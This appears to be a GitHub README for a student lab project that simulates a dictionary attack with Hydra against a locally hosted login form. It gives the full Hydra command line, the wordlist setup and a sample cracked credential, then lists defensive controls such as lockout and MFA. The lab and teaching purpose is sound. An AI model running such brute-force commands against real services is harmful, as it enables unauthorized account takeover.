# Brute-Force-Attack-Simulation-with-Hydra
 Brute Force Attack Simulation with Hydra
A personal cybersecurity project exploring password vulnerabilities through hands on brute force attack simulation using Hydra on a controlled local web environment.

 Overview
This project demonstrates how weak passwords can be compromised using automated tools. By setting up a local login target and running Hydra against it, I was able to observe firsthand how quickly common passwords fall to dictionary based attacks and why strong password policies matter.
Key concepts covered:

How brute-force and dictionary attacks work
Setting up and configuring Hydra for HTTP form-based attacks
Analyzing attack results and identifying vulnerable credentials
Understanding why generic error messages and account lockouts are critical defenses


Tools & Environment
ToolPurposeHydraAutomated password cracking / brute-force toolLinux (Xfce)Lab operating systemLocal HTTP server (port 8080)Target login pageCustom wordlistsUsername and password dictionaries

 Methodology
1. Manual Reconnaissance
Before running any automated tools, I manually tested a few common credential combinations (admin/admin, test/password123) against the login form to understand its behavior. The server returned a generic "Invalid username or password" response for all failed attempts — intentionally vague to avoid leaking whether the username itself is valid.
2. Preparing the Wordlists
I used a curated list of the 500 most common passwords alongside a short username list containing common defaults (admin, user, root).
bashecho -e "admin\nuser\nroot" > usernames.txt
head -n 10 500-worst-passwords.txt
Sample output:
123456
password
12345678
1234
12345
dragon
qwerty
mustang
letmein
3. Running Hydra
I configured Hydra to target the local HTTP login form, feeding it the username and password wordlists:
bashhydra -L usernames.txt \
      -P 500-worst-passwords.txt \
      localhost -s 8080 \
      http-post-form "/:username=^USER^&password=^PASS^:Invalid username or password" \
      -o hydra_results.txt
Command breakdown:
FlagDescription-L usernames.txtFile containing usernames to test-P 500-worst-passwords.txtFile containing passwords to testlocalhost -s 8080Target host and porthttp-post-formAttack mode for HTTP POST login forms^USER^ / ^PASS^Hydra placeholders for injected credentialsInvalid username or passwordFailure string used to detect bad logins-o hydra_results.txtOutput file for successful logins
4. Reviewing Results
After Hydra completed its run, I reviewed the output file to identify which credentials were successfully cracked:
bashcat hydra_results.txt
Successful logins were logged in the format:
[8080][http-post-form] host: localhost   login: admin   password: 1234

Key Takeaways

Automated tools are fast. Hydra tested hundreds of combinations in minutes — something that would take hours manually.
Common passwords are a real threat. Several credentials from the "500 worst passwords" list produced successful logins.
Generic error messages help. Not revealing whether a username exists adds a small but meaningful layer of friction for attackers.
Missing rate limiting is dangerous. The absence of account lockouts or CAPTCHAs on the test server made this attack trivially easy. Production systems must implement these controls.
Dictionary attacks > pure brute force. Using known bad passwords dramatically narrows the search space and speeds up results.


 Defensive Recommendations
Based on this exercise, the following controls would significantly reduce the effectiveness of this type of attack:

Enforce strong password policies — minimum length, complexity requirements, no common passwords
Implement account lockout — temporarily disable accounts after N failed attempts
Add CAPTCHA or MFA — break automated credential stuffing flows
Use generic error messages — never confirm whether a username exists
Monitor for login anomalies — alert on high-volume failed attempts from the same IP


 Disclaimer
This project was conducted entirely in a controlled, isolated lab environment against a locally hosted target. All techniques demonstrated here are for educational purposes only. Unauthorized use of tools like Hydra against systems you do not own or have explicit permission to test is illegal and unethical.

 References

Hydra GitHub Repository
OWASP Brute Force Attack
NIST Password Guidelines (SP 800-63B)
